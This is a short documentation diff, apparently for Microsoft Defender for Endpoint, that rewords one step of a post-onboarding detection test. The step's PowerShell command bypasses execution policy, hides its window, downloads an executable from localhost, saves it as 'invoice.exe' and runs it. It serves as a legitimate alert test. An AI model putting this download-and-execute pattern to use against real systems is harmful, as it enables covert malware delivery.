@@ -78,7 +78,7 @@ After you have onboarded a device manually, you can run a detection test to make
 
 2. Open Command Prompt as an administrator.
 
-3. In the Command Prompt window, type the following PowerShell command:
+3. In the Command Prompt window, run the following PowerShell command:
 
    ```powershell
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
